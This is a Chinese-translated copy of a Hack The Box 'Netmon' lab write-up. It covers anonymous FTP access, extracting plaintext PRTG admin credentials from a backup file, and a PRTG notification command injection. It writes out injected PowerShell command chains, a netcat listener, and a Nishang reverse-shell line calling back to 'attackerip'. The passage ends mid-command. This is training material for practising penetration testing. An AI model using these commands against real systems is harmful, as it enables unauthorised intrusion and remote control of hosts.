<html>
<head>
<title>HacktheBox — Netmon</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox — Netmon</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-netmon-write-up-9e7a6bdb0e97?source=collection_archive---------0-----------------------#2019-06-29">https://infosecwriteups.com/hackthebox-netmon-write-up-9e7a6bdb0e97?source=collection_archive---------0-----------------------#2019-06-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="97ee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何解决黑客盒子中的Netmon的文章。</p><p id="3a7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="edb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我一直做的那样，我试图解释我是如何从机器上理解这里的概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。非常欢迎您的指正。:D</p><h1 id="75b5" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">关于盒子</h1><p id="8d6f" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">Netmon是一个有趣又简单的盒子，我认为它是针对那些开始玩HacktheBox的初学者的。它教你不要把注意力放在漏洞上，而是想想你可以滥用系统运行的方式。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/e04e0c91fa9abf225c5d448b6edd375f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*FP_sGMOZ5jc7YkXW8qdOAw.png"/></div><figcaption class="lx ly gj gh gi lz ma bd b be z dk translated">来源:https://www.hackthebox.eu/home/machines/profile/177<a class="ae kl" href="https://www.hackthebox.eu/home/machines/profile/177" rel="noopener ugc nofollow" target="_blank"/></figcaption></figure><h1 id="2030" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">#TLDR</h1><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="2b6d" class="mg kn iq mc b gy mh mi l mj mk"><strong class="mc ir">Initial foothold: </strong>FTP allows anonymous login, and surprisingly has lots of access LOL<br/><strong class="mc ir">User: </strong>Just read what’s in the Public directory..<br/><strong class="mc ir">Root:</strong> PRTG Network Monitor command as the argument supplied in the “Parameter” field of the “Notifications” configuration is passed directly into the PowerShell script without any  sanitation, resulting in to the ability to inject any other PowerShell code.</span></pre><h1 id="79da" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">#初始立足点/获取用户</h1><p id="9a02" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我首先通过调用命令运行初始Nmap扫描，将其保存到Nmap目录:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="b04b" class="mg kn iq mc b gy mh mi l mj mk">nmap -sV -sC -oA nmap/initial 10.10.10.152</span></pre><p id="bdfa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还运行了一个curl命令来检查端口80(HTTP)中是否有东西在运行</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="af6d" class="mg kn iq mc b gy mh mi l mj mk">➜  Netmon curl 10.10.10.152                                                                                                       <br/>&lt;html&gt;&lt;head&gt;&lt;title&gt;PRTG Starting...&lt;/title&gt;&lt;style&gt;body,pre,p,h2, div,span {font-family:  "Lucida Sans-Serif", "Segoe UI", Tahoma, <br/>Arial, Helvetica, sans-serif;}h2 {font-weight:500}body, html {background-color: #f4f6f7;margin:0px;height:100%;}pre {padding:5px;f<br/>ont-size:11px;}img {border: 0px;}span, a {font-size: 10px;color: #333333;text-decoration: none;}body {  background: #fff}#header {<br/>position: absolute;width: 100%;height: 22px;top: 0px;left:0px;padding: 0px;margin: 0px;background-color: #d6d7d8;}#footer {positio<br/>n: absolute;width: 100%;height: 24px;bottom: 0px;left: 0px;background-color: #d6d7d8;}#copytext {position: absolute;bottom: 1px;ri<br/>ght: 22px;}#prtgversiontext {position: absolute;bottom: 1px;left: 4px;}#prtglogobig {background-image: url(data:image/png;base64,i<br/>VBORw0KGgoAAAANSUhEUgAAAPoAAACWCAYAAAD32pUcAAAAB3RJTUUH3QoJDBs6M+wZNgAAAAlwSFlzAAALEgAACxIB0t1+/AAARpRJREFUeNrsnQdYFEcbgLfcHcfRi/Q<br/>OUsWCICpiQ8WGLRqxBSUaY7DEEjTGEnuvaPRP7JWoaNQoUURFVBAEEUVAIVQFKQcH18vuv5v85jd4e1zbu9Pn3ufZB25nduab2f1mvpn5dhZEURTQo0fPpw2kbQH06NFDP<br/>hRtC6BHjyxQiQBCWWW2aGN+N5RVGoC2lHuhzEJnQCKwxYLNgX8/w3zsaAKNnWoAQ+sKyDLgFWjmmQ9aB+YDRo4sEIK1XRytAepNdz26BqbMZkhlyhCk+vYwtO5JX0DMcQd<br/>Usz4FgLFTPmTb4w7kOvQ66Nj3AUg1Emu7nJpEr+h6dAJU2EJDSpIikeIzMWhT8TDsDIOsrADYsBZyHnge6vj5cdAhLBeEDbRdfNLRK7oerYK2VplKnh2ciZRdjQMETR4az<br/>l4CmLg+gAO/3gG5R10HDcw+2V5er+h6tAIqaKZLsjfGIaUXl2DjbTttiwMYOTyBuy5YCXWcmIyN5T85pdAruh6NgkqEAFJ4bJQkb89OQNjiqW152gJa+CbDPdctgux7Fml<br/>bFrWWS6/oejQF2lzSQZy+eD9an/sZoMtLuyDEgXymrINDftjxqUza6RVdD+mgKAIgRacjJFlrjwISvrO25ZFXbNDC5w7cd3cMZNWpWtvCqIpe0fWQCirmA5LMVUuQl2c3Y<br/>D9p2pZHYShGNXDYpmjYc+w9bYuiCnpF10MaqJhHFafMOIDWPIjFfoLalkcFBFDAzNlwj1XHQfDjLIbujpP0fNRwBbWMh8Vf/9rQ+vhL4ONWchwDpODQYUnWhoUo8nF2jHp<br/>F16N2ROIWg0ev5iY281+OzXe1AlrpH7+nNWb4wrwdD7bzVl+M/xiVXa/oetSKBOFDuX+uOMIVvI7Cf4spEJDnbg3wqSo/aiLsYGJHDXbUAX/7tWsEfHQryvACRDfdIH5C6<br/>kbeyotfaSpvdaEfo+tRG/iz9Lg0fnMd63480MZcN+EKgeDSeoDSfm+IAlSTMtC6czpkF5oFmHnlg0Z22O+ub/8K+/vA0wbRxmfmgJDljjaX+CFvs3ugdY/DAV69P6Dml7V<br/>EeS6A4FRnAED+KZKQsWfyWHpMn+varnN50Su6HrXx8s2hSa9qDp8CCCxFaxYP6FLeKC0QM4wNqiG3EacglyHnQKcBz0EqQ+H1a1QixJT/uTtSmjQOqbg5DeDWdgJUtFrFr<br/>+wA/qHumLa3SQaGmCa/ze9NDfcu1lwNK49e0fWohfqWLJ/sV4syUEBiISuecwMb8Hnd/K67RwG65XO40+wtkHd0Eki3VJs5joq4EFKd2h/J27sUbSoaDCgxISh5bQnwDoQ<br/>CAFe6gQDamuaapS/vA9mY8sisW3WgV3Q9KiOSsKnpL6bd4wlre7YbGXvevGpYgDtTUgt3/uZ7qNOskyDVSEKmfJKXiYMkOdu2A7y6LvJegzSaALyE3gDaInvpnzrIf6fJh<br/>bmLyZRfHegn4/SoTGF1wgJMyUPligyCSJP3gJPQ+NROcLdvj5Gt5Diwd/Qt6piboZDX+NUA/m56OyCthgDvUI92lRxHdOvFPEHioz5kl0FV9D26HpVgcYqc7hfNKMT...</span></pre><p id="8eb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">知道端口80上有东西，我查看页面。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/a366263e932e7275c27cc558cd21504e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4Aqsv3up_VmE4hh3EhQmyg.png"/></div></div></figure><p id="164e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我现在知道有一个登录页面。注意，如果我们用HTTP运行curl，我没有得到任何输出(不知道为什么。)</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="8f5f" class="mg kn iq mc b gy mh mi l mj mk">curl http://10.10.10.152</span></pre><p id="9afb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">检查我的Nmap的输出:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="db93" class="mg kn iq mc b gy mh mi l mj mk">Nmap scan report for 10.10.10.152<br/>Host is up (0.44s latency).<br/>Not shown: 996 closed ports<br/>PORT    STATE SERVICE      VERSION<br/>21/tcp  open  ftp          Microsoft ftpd<br/>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>| 02-02-19  11:18PM                 1024 .rnd<br/>| 02-25-19  09:15PM       &lt;DIR&gt;          inetpub<br/>| 07-16-16  08:18AM       &lt;DIR&gt;          PerfLogs<br/>| 02-25-19  09:56PM       &lt;DIR&gt;          Program Files<br/>| 02-02-19  11:28PM       &lt;DIR&gt;          Program Files (x86)<br/>| 02-03-19  07:08AM       &lt;DIR&gt;          Users<br/>|_03-05-19  01:25AM       &lt;DIR&gt;          Windows<br/>| ftp-syst: <br/>|_  SYST: Windows_NT<br/>135/tcp open  msrpc        Microsoft Windows RPC<br/>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn<br/>445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br/>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><span id="5543" class="mg kn iq mc b gy mq mi l mj mk">Host script results:<br/>| smb-security-mode: <br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2019-03-04 22:43:28<br/>|_  start_date: 2019-03-04 21:55:24</span><span id="4e9b" class="mg kn iq mc b gy mq mi l mj mk">Service detection performed. Please report any incorrect results at <a class="ae kl" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .</span></pre><p id="e818" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我没有看到端口80，但我可以访问登录页面。</p><p id="6e8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到FTP可用(端口21)，但没有可用的凭证，我尝试以匿名身份登录。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="bc07" class="mg kn iq mc b gy mh mi l mj mk">➜  Netmon ftp 10.10.10.152<br/>Connected to 10.10.10.152.<br/>220 Microsoft FTP Service<br/>Name (10.10.10.152:root): anonymous<br/>331 Anonymous access allowed, send identity (e-mail name) as password.<br/>Password:<br/>230 User logged in.<br/>Remote system type is Windows_NT.<br/>ftp&gt; ls<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-03-19  12:18AM                 1024 .rnd<br/>02-25-19  10:15PM       &lt;DIR&gt;          inetpub<br/>06-29-19  08:58AM                   74 output.txt<br/>07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs<br/>02-25-19  10:56PM       &lt;DIR&gt;          Program Files<br/>02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)<br/>02-03-19  08:08AM       &lt;DIR&gt;          Users<br/>02-25-19  11:49PM       &lt;DIR&gt;          Windows<br/>226 Transfer complete.</span></pre><p id="0cba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">查看C:\Users\Public\，我发现user.txt在那里..😆</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="674c" class="mg kn iq mc b gy mh mi l mj mk">ftp&gt; get user.txt<br/>local: user.txt remote: user.txt<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>WARNING! 1 bare linefeeds received in ASCII mode<br/>File may not have transferred correctly.<br/>226 Transfer complete.<br/>33 bytes received in 0.28 secs (0.1145 kB/s)<br/>ftp&gt; exit<br/>221 Goodbye.<br/>➜  Netmon cat user.txt <br/><strong class="mc ir">dd58ce67b49e15105.....</strong></span></pre><h1 id="e4e4" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">获取根目录:</h1><p id="c5de" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">大多数隐私的发生是因为错误配置或过时的程序。我首先检查过时的程序。去程序文件和“PRTG网络监视器”脱颖而出，因为这是不常见的Windows默认安装(加上盒子的名字给出了提示)。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="8e1e" class="mg kn iq mc b gy mh mi l mj mk">ftp&gt; ls<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-03-19  12:18AM                 1024 .rnd<br/>02-25-19  10:15PM       &lt;DIR&gt;          inetpub<br/>06-29-19  08:58AM                   74 output.txt<br/>07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs<br/>02-25-19  10:56PM       &lt;DIR&gt;          Program Files<br/>02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)<br/>02-03-19  08:08AM       &lt;DIR&gt;          Users<br/>02-25-19  11:49PM       &lt;DIR&gt;          Windows<br/>226 Transfer complete.<br/>ftp&gt; cd "Program Files"<br/>250 CWD command successful.<br/>ftp&gt; ls<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-25-19  10:56PM       &lt;DIR&gt;          Common Files<br/>07-16-16  09:18AM       &lt;DIR&gt;          internet explorer<br/>02-25-19  10:56PM       &lt;DIR&gt;          VMware<br/>11-20-16  09:53PM       &lt;DIR&gt;          Windows Defender<br/>07-16-16  09:18AM       &lt;DIR&gt;          WindowsPowerShell<br/>02-03-19  12:18AM       &lt;DIR&gt;          WinPcap<br/>226 Transfer complete.<br/>ftp&gt; cd ..<br/>250 CWD command successful.<br/>ftp&gt; cd "Program Files (x86)"<br/>250 CWD command successful.<br/>ftp&gt; ls<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>07-16-16  09:18AM       &lt;DIR&gt;          Common Files<br/>07-16-16  09:18AM       &lt;DIR&gt;          internet explorer<br/>07-16-16  09:18AM       &lt;DIR&gt;          Microsoft.NET<br/>06-29-19  08:41AM       &lt;DIR&gt;          PRTG Network Monitor<br/>11-20-16  09:53PM       &lt;DIR&gt;          Windows Defender<br/>07-16-16  09:18AM       &lt;DIR&gt;          WindowsPowerShell<br/>226 Transfer complete.</span></pre><p id="fb78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">浏览文件并搜索凭证是否存储在一个文件中(这是大多数枚举发生的地方)，我在目录下找到了一个PRTG Configuration.old.bak，这似乎是一个备份文件。如果你只是运行“ls”或寻找文件，你不会发现这是因为“所有用户”目录是隐藏的。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="a60c" class="mg kn iq mc b gy mh mi l mj mk">ftp&gt; ls<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-25-19  11:44PM       &lt;DIR&gt;          Administrator<br/>06-29-19  09:36AM       &lt;DIR&gt;          Public<br/>226 Transfer complete.<br/>ftp&gt; dir<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-25-19  11:44PM       &lt;DIR&gt;          Administrator<br/>06-29-19  09:36AM       &lt;DIR&gt;          Public<br/>226 Transfer complete.<br/>ftp&gt;</span></pre><p id="d820" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你必须列出隐藏的目录，通过“ls -la”。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="5cfc" class="mg kn iq mc b gy mh mi l mj mk">ftp&gt; ls -al<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-25-19  11:44PM       &lt;DIR&gt;          Administrator<br/>07-16-16  09:28AM       &lt;DIR&gt;          All Users<br/>02-03-19  08:05AM       &lt;DIR&gt;          Default<br/>07-16-16  09:28AM       &lt;DIR&gt;          Default User<br/>07-16-16  09:16AM                  174 desktop.ini<br/>06-29-19  09:36AM       &lt;DIR&gt;          Public<br/>226 Transfer complete.<br/>ftp&gt;</span></pre><p id="7624" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到“所有用户\派斯勒\PRTG网络监视器\”，我们找到PRTG配置.旧.巴克文件。这可以是存储凭证的备份文件。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="0dc2" class="mg kn iq mc b gy mh mi l mj mk">ftp&gt; ls<br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>02-03-19  12:40AM       &lt;DIR&gt;          Configuration Auto-Backups<br/>06-29-19  09:29AM       &lt;DIR&gt;          Log Database<br/>02-03-19  12:18AM       &lt;DIR&gt;          Logs (Debug)<br/>02-03-19  12:18AM       &lt;DIR&gt;          Logs (Sensors)<br/>02-03-19  12:18AM       &lt;DIR&gt;          Logs (System)<br/>06-29-19  09:29AM       &lt;DIR&gt;          Logs (Web Server)<br/>02-25-19  08:01PM       &lt;DIR&gt;          Monitoring Database<br/>02-25-19  10:54PM              1189697 PRTG Configuration.dat<br/>02-25-19  10:54PM              1189697 PRTG Configuration.old<br/>07-14-18  03:13AM              1153755 PRTG Configuration.old.bak<br/>06-29-19  09:30AM              1647604 PRTG Graph Data Cache.dat<br/>02-25-19  11:00PM       &lt;DIR&gt;          Report PDFs<br/>02-03-19  12:18AM       &lt;DIR&gt;          System Information Database<br/>02-03-19  12:40AM       &lt;DIR&gt;          Ticket Database<br/>02-03-19  12:18AM       &lt;DIR&gt;          ToDo Database<br/>226 Transfer complete.</span></pre><p id="a670" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用get命令下载文件:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="e405" class="mg kn iq mc b gy mh mi l mj mk">ftp&gt; get "PRTG Configuration.old.bak"<br/>local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak                                                             <br/>200 PORT command successful.<br/>125 Data connection already open; Transfer starting.<br/>226 Transfer complete.</span></pre><p id="480c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我搜索字符串“password”并查看字符串(-C 10)“password”前后的行，以查找任何与其相近的条目。我把它管得更少。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="c6d5" class="mg kn iq mc b gy mh mi l mj mk">grep -C 10 password ‘PRTG Configuration.old.bak’| less</span></pre><p id="0a2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="fb53" class="mg kn iq mc b gy mh mi l mj mk">&lt;flags&gt;<br/>                &lt;encrypted/&gt;<br/>              &lt;/flags&gt;<br/>            &lt;/comments&gt;<br/>            &lt;dbauth&gt;<br/>              0<br/>            &lt;/dbauth&gt;<br/>            &lt;dbcredentials&gt;<br/>              0<br/>            &lt;/dbcredentials&gt;<br/>            &lt;dbpassword&gt;<br/>              &lt;!-- User: <strong class="mc ir">prtgadmin</strong> --&gt;<br/>              <strong class="mc ir">PrTg@dmin2018</strong><br/>            &lt;/dbpassword&gt;<br/>            &lt;dbtimeout&gt;<br/>              60<br/>            &lt;/dbtimeout&gt;<br/>            &lt;depdelay&gt;<br/>              0<br/>            &lt;/depdelay&gt;<br/>            &lt;dependencytype&gt;<br/>              0<br/>            &lt;/dependencytype&gt;<br/>            &lt;discoveryschedule&gt;<br/>--<br/>              0<br/>            &lt;/discoverytypegroup&gt;</span></pre><p id="b4c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我们找到凭证。</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="3570" class="mg kn iq mc b gy mh mi l mj mk"><strong class="mc ir">prtgadmin:PrTg@dmin2018</strong></span></pre><p id="bbf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试使用中小企业的信用登录，但没有成功。然后，我们在登录页面上尝试这样做，但这不起作用。由于密码包含2018，通过做一点猜测，我将其更改为2019，它可以工作。🐵</p><p id="ced4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我们以管理员身份访问监视器，所以我们最有可能以管理员身份运行东西。我们可以通过在您的本地系统上安装应用程序来验证它，因为这有助于理解程序是如何工作的。但是对于这个盒子，我不想走那么远。</p><p id="9686" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我谷歌了一个PRTG漏洞，无意中发现了这个链接。建议你通读一遍，了解它的工作原理:</p><div class="mr ms gp gr mt mu"><a href="https://www.codewatch.org/blog/?p=453" rel="noopener  ugc nofollow" target="_blank"><div class="mv ab fo"><div class="mw ab mx cl cj my"><h2 class="bd ir gy z fp mz fr fs na fu fw ip bi translated">PRTG &lt; 18.2.39 Command Injection Vulnerability</h2><div class="nb l"><h3 class="bd b gy z fp mz fr fs na fu fw dk translated">This post is as much about the penetration testing process and mindset as it is about the vulnerability I discovered in…</h3></div><div class="nc l"><p class="bd b dl z fp mz fr fs na fu fw dk translated">www.codewatch.org</p></div></div></div></a></div><p id="1c20" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Understanding how this works teaches you to not depend on tools or the fanciest exploit, but consider also files that may run with Administrator privileges, especially when input is not sanitized.</p><p id="900d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Understanding the write up, we can have command execution. In the write up, he adds an Administrator account. For the sake of this box, what we need to do is write on the .ps1 file mentioned, then let it execute a command that will download and execute our reverse shell so we can have control of the box.</p><p id="ab31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I first try to check if command execution works by making the box ping my IP. I setup my sniffer:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="ce46" class="mg kn iq mc b gy mh mi l mj mk">➜  Netmon tcpdump -i tun0 icmp<br/>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode<br/>listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span></pre><p id="e48c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">The command below tells the box to write on the directory C:\Users\Public\ and name it test.txt. Then it will read the file we created, and then execute the next command after that(since it was able to execute the command before it). My IP when I was re-solving this box is used below.</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="1c97" class="mg kn iq mc b gy mh mi l mj mk">echo huhu &gt; C:\Users\Public\test.txt; type C:\Users\Public\test.txt ; ping -n 5 10.10.13.148</span></pre><p id="6d4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I enable Execute Program and put the command above on the Parameter field of the “Email and push notification to admin” notification(you can choose any, as long as you map it to the correct alert), which is executed and written on the .ps1 file when we trigger the notification.</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nd"><img src="../Images/535973ec2649514ff79a5969afd8899c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KViG8PRh2VfOSJqohGNZuQ.png"/></div></div></figure><p id="7253" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I triggered the Ping alert by clicking “check now”.</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ne"><img src="../Images/95c18c7a5f8af53b8f0ae2ac25677978.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6JTe4vBNcxaakjsS0hG6DQ.png"/></div></div></figure><p id="3a0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">I see ICMPpackets in tcpdump:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="135a" class="mg kn iq mc b gy mh mi l mj mk">➜  Netmon tcpdump -i tun0 icmp<br/>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode<br/>listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes<br/>14:40:50.173021 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 326, length 40<br/>14:40:50.173030 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 326, length 40<br/>14:40:51.311428 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 329, length 40<br/>14:40:51.311441 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 329, length 40<br/>14:40:52.320735 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 330, length 40<br/>14:40:52.320758 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 330, length 40<br/>14:40:53.405802 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 331, length 40<br/>14:41:22.282099 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 353, length 40<br/>14:41:22.282143 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 353, length 40<br/>14:41:23.298609 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 354, length 40<br/>14:41:23.298655 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 354, length 40<br/>14:41:24.316551 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 355, length 40<br/>14:41:24.316565 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 355, length 40<br/>14:41:30.007785 IP 10.10.10.152 &gt; kali: ICMP echo request, id 1, seq 362, length 40<br/>14:41:30.007800 IP kali &gt; 10.10.10.152: ICMP echo reply, id 1, seq 362, length 40</span></pre><p id="8041" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Now we know we have code execution. We then prepare to get our shell. We set up our listener:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="7089" class="mg kn iq mc b gy mh mi l mj mk"><strong class="mc ir">nc -nlvp 9001</strong></span></pre><p id="a066" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">We set up our SimpleHTTPServer(default is port 8000) where the PowerShell script will be downloaded which will connect to our listener. This will serve all the files under the directory where we ran the command above at http://attackerip:8000.</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="6a9a" class="mg kn iq mc b gy mh mi l mj mk"><strong class="mc ir">python3 -m http.server </strong></span></pre><p id="a706" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">The file being served is a PowerShell script from <a class="ae kl" href="https://github.com/samratashok/nishang/tree/master/Shells" rel="noopener ugc nofollow" target="_blank">霓裳</a>。我使用了Invoke-PowerShellTcp.ps1。我们在最底部附加了我们想要的命令(阅读脚本的内容，您就会理解它的语法)。将此添加到脚本的底部:</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="8fca" class="mg kn iq mc b gy mh mi l mj mk"><strong class="mc ir">Invoke-PowerShellTcp -Reverse -IPAddress attackerip -Port 9001</strong></span></pre><p id="2cd7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我只是把命令从ping改为让它下载我们的. ps1文件，然后执行它。我把文件名改成了rev.ps1</p><pre class="lq lr ls lt gt mb mc md me aw mf bi"><span id="1a26" class="mg kn iq mc b gy mh mi l mj mk">echo huhu &gt; C:\Users\Public\test.txt; type C:\Users\Public\test.txt ; 